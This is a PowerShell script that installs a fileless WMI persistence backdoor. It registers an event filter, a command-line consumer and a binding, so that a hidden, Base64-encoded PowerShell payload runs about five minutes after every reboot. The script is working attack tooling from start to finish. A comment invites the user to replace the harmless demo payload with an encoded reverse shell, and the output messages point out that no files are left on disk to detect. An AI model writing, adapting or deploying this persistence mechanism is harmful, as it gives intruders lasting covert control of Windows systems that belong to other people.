# ==============================================================================
# 🍯 Zencefil Efendi's WMI Event Subscription Persistence (Fileless)
# Description: Creates a permanent, fileless backdoor using WMI. 
#              It triggers a Base64 PowerShell payload 5 minutes after system boot.
# Usage: Run as Administrator.
# ==============================================================================

# 1. The Payload (Your Malicious Action)
# Example Payload: Write a file to temp. Replace this with your encoded Reverse Shell.
$Payload = "Write-Host 'Zencefil WMI Backdoor Triggered!'; Out-File -FilePath C:\Windows\Temp\molasses.txt -InputObject 'Zencefil was here.'"
$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))
$Command = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $EncodedPayload"

# 2. Event Filter (The Trigger)
# Trigger: System Uptime is exactly 5 minutes (300 seconds)
$FilterName = "ZencefilBootFilter"
$FilterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 360"
$FilterNS = "root\subscription"

$FilterArgs = @{
    Name = $FilterName
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = $FilterQuery
}
$Filter = Set-WmiInstance -Namespace $FilterNS -Class __EventFilter -Arguments $FilterArgs

# 3. Event Consumer (The Action)
$ConsumerName = "ZencefilPayloadConsumer"
$ConsumerArgs = @{
    Name = $ConsumerName
    CommandLineTemplate = $Command
}
$Consumer = Set-WmiInstance -Namespace $FilterNS -Class CommandLineEventConsumer -Arguments $ConsumerArgs

# 4. FilterToConsumerBinding (Binding the Trigger to the Action)
$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace $FilterNS -Class __FilterToConsumerBinding -Arguments $BindingArgs

Write-Host "[+] 🍯 Zencefil WMI Persistence Installed Successfully."
Write-Host "[+] The payload will execute silently 5 minutes after every system reboot."
Write-Host "[!] Note: No malicious files were dropped on disk."
